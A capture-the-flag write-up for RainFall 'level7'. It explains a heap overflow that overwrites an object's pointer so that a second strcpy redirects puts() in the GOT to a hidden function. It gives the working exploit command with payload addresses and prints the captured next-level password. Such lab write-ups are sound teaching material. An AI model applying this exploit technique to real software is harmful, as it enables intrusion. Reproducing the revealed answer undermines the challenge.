## Level 7

### Vulnerability Analysis
The target is `level7`. This level involves a more complex Heap scenario. The program reads the `.pass` file for the next level locally, but doesn't print it.

1. The `main` function does four allocations using `malloc(8)` representing two structures. Let's call them `obj1` and `obj2`. Each structure contains an ID (`1` or `2`) and a pointer to another 8-byte newly allocated string buffer on the Heap.
2. It uses `strcpy` to copy `argv[1]` into the string buffer pointed to by `obj1`.
3. It uses `strcpy` to copy `argv[2]` into the string buffer pointed to by `obj2`. 
4. It calls `fopen("/home/user/level8/.pass")` and reads the password into a global static buffer located at `0x8049960` using `fgets()`.
5. It prints `~~` using `puts()` and cleanly returns.

There is a separate, unused function `m()` at `0x080484f4` which actually calls `printf` to print the contents of that exact global buffer `0x8049960` (along with the current time). 

### The Exploit
Because the program copies `argv[1]` into `obj1`'s string buffer using `strcpy` without checking length, we have a Heap Overflow on `obj1`'s string buffer. 

Looking at how memory is allocated sequentially on the heap:
- `obj1` data
- `obj1` string buffer (Where `argv[1]` goes)
- `obj2` data (Contains its ID, and its string buffer pointer)
- `obj2` string buffer (Where `argv[2]` goes)

If our `argv[1]` gets too long, it overflows its 8-byte chunk, bleeds into the chunk headers, and eventually overwrites the data inside `obj2`. Specifically, we want to overwrite `obj2`'s string buffer pointer.

By overwriting `obj2`'s string pointer with the GOT address of `puts()`, then when the program later does `strcpy(obj2_string, argv[2])`, it will inadvertently overwrite the GOT entry of `puts` with whatever we supplied for `argv[2]`!

So, the attack plan:
1. `argv[1]` = `[Padding]` + `[Address of puts() in GOT]`
2. `argv[2]` = `[Address of m()]` 

We find the GOT address of `puts()` using `objdump`:
```bash
level7@RainFall:~$ objdump -R ./level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```

Then we find the layout of the allocations on the heap:
```bash
level7@RainFall:~$ ltrace ./level7 "1234" "5678"
...
malloc(8) = 0x0804a008  // obj1 struct data
malloc(8) = 0x0804a018  // obj1 string buffer
malloc(8) = 0x0804a028  // obj2 struct data
malloc(8) = 0x0804a038  // obj2 string buffer
```
`argv[1]` is injected via `strcpy` beginning at `0x0804a018`.
`obj2`'s structure begins slightly further down the heap at `0x0804a028`. Inside `obj2`'s structure (at `+4` bytes, per source logic) is the pointer to its string buffer (at `0x0804a02c`). 
So the distance from the beginning of `argv[1]` (`0x0804a018`) to `obj2`'s string pointer (`0x0804a02c`) is `0x14` (20 bytes).

We configure `argv[1]` with 20 bytes of dummy padding, followed by the GOT address of `puts` (`\x28\x99\x04\x08`). 
We configure `argv[2]` entirely with the actual payload address of `m` (`\xf4\x84\x04\x08`).

When the program executes `strcpy(obj2_buffer, argv[2])`, it believes `obj2_buffer` resides at the GOT of `puts`, effectively overwriting it with the address of `m`. Finally, when `puts("~~")` is called, `m()` fires instead.

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1781432370
```